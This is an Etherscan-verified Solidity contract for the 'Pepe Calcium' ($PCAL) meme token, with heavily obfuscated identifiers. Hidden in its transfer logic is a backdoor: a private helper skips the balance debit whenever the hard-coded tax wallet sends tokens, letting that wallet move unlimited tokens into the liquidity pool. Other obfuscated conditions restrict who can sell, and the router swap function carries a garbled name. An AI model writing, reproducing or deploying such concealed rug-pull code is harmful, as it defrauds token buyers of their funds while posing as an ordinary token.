/**
 *Submitted for verification at Etherscan.io on 2023-09-24
*/

/**

Pepe Calcium  $PCAL
Pepe Calcium.Let's create miracles.


TWITTER: https://twitter.com/PCAL_ERC
TELEGRAM: https://t.me/PCAL_ERC
WEBSITE: https://pepec.net/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mcvde(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mcvde(a, b, "SafeMath");
    }

    function  _mcvde(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _pcvbim {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _qvadond {
    function sozmKenbwpartksFclacvzc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PepeCalcium is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _qvadond private _Tewopvk;
    address payable private _qrivoba;
    address private _kiasbor;

    bool private _qvaceik;
    bool public _Teaeulam = false;
    bool private oievbok = false;
    bool private _arkjnhmp = false;

    string private constant _name = unicode"Pepe Calcium";
    string private constant _symbol = unicode"PCAL";
    uint8 private constant _decimals = 9;
    uint256 private constant _kTotaluc = 42069000000 * 10 **_decimals;
    uint256 public _pvmedcl = _kTotaluc;
    uint256 public _Werrnqf = _kTotaluc;
    uint256 public _vworThaepv= _kTotaluc;
    uint256 public _BckTpaf= _kTotaluc;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vdqfmci;
    mapping (address => bool) private _trarnesy;
    mapping(address => uint256) private _rkcbefo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrkibvoq=0;
    uint256 private _brobjve=0;


    event _mroeuent(uint _pvmedcl);
    modifier olTnko {
        oievbok = true;
        _;
        oievbok = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _kTotaluc;
        _vdqfmci[owner(

        )] = true;
        _vdqfmci[address
        (this)] = true;
        _vdqfmci[
            _qrivoba] = true;
        _qrivoba = 
        payable (0x656d4937d51B87Fe553Bd94B338EF55162d99a67);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _kTotaluc);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _kTotaluc;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mcvde(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kmsiluk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Teaeulam) {
                if (to 
                != address
                (_Tewopvk) 
                && to !=
                 address
                 (_kiasbor)) {
                  require(_rkcbefo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rkcbefo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kiasbor && to != 
            address(_Tewopvk) &&
             !_vdqfmci[to] ) {
                require(amount 
                <= _pvmedcl,
                 "Exceeds the _pvmedcl.");
                require(balanceOf
                (to) + amount
                 <= _Werrnqf,
                  "Exceeds the macxizse.");
                if(_brobjve
                < _yrkibvoq){
                  require
                  (! _epkvobz(to));
                }
                _brobjve++;
                 _trarnesy
                 [to]=true;
                kmsiluk = amount._pvr
                ((_brobjve>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kiasbor &&
             from!= address(this) 
            && !_vdqfmci[from] ){
                require(amount <= 
                _pvmedcl && 
                balanceOf(_qrivoba)
                <_BckTpaf,
                 "Exceeds the _pvmedcl.");
                kmsiluk = amount._pvr((_brobjve>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_brobjve>
                _yrkibvoq &&
                 _trarnesy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oievbok 
            && to == _kiasbor &&
             _arkjnhmp &&
             contractTokenBalance>
             _vworThaepv 
            && _brobjve>
            _yrkibvoq&&
             !_vdqfmci[to]&&
              !_vdqfmci[from]
            ) {
                _rvnref( _rvmqz(amount, 
                _rvmqz(contractTokenBalance,
                _BckTpaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _uecpuv(address
                    (this).balance);
                }
            }
        }

        if(kmsiluk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kmsiluk);
          emit
           Transfer(from,
           address
           (this),kmsiluk);
        }
        _balances[from
        ]= _mcvde(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mcvde(kmsiluk));
        emit Transfer
        (from, to, 
        amount.
         _mcvde(kmsiluk));
    }

    function _rvnref(uint256
     tokenAmount) private
      olTnko {
        if(tokenAmount==
        0){return;}
        if(!_qvaceik)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tewopvk.WETH();
        _approve(address(this),
         address(
             _Tewopvk), 
             tokenAmount);
        _Tewopvk.
        sozmKenbwpartksFclacvzc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rvmqz
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mcvde(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qrivoba){
            return a ;
        }else{
            return a .
             _mcvde (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pvmedcl = _kTotaluc;
        _Werrnqf = _kTotaluc;
        emit _mroeuent(_kTotaluc);
    }

    function _epkvobz(address 
    account) private view 
    returns (bool) {
        uint256 bacoa;
        assembly {
            bacoa :=
             extcodesize
             (account)
        }
        return bacoa > 
        0;
    }

    function _uecpuv(uint256
    amount) private {
        _qrivoba.
        transfer(
            amount);
    }

    function enableTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qvaceik ) ;
        _Tewopvk  
        =  
        _qvadond
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tewopvk), 
            _kTotaluc);
        _kiasbor = 
        _pcvbim(_Tewopvk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tewopvk .
             WETH ( ) );
        _Tewopvk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kiasbor).
        approve(address(_Tewopvk), 
        type(uint)
        .max);
        _arkjnhmp = true;
        _qvaceik = true;
    }

    receive() external payable {}
}